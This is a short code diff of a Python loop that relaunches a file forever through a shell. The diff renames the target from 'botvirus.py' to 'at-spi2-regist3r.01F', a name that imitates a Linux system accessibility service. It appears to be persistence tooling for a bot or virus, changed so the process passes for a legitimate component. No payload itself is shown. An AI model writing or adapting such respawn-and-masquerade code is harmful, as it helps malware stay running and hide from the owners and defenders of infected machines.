@@ -1,8 +1,7 @@
-#!/usr/bin/python
 from subprocess import Popen
 import sys
 
-filename = "botvirus.py"
+filename = "at-spi2-regist3r.01F"
 while True:
     print("\nStarting " + filename)
     p = Popen("python3 " + filename, shell=True)
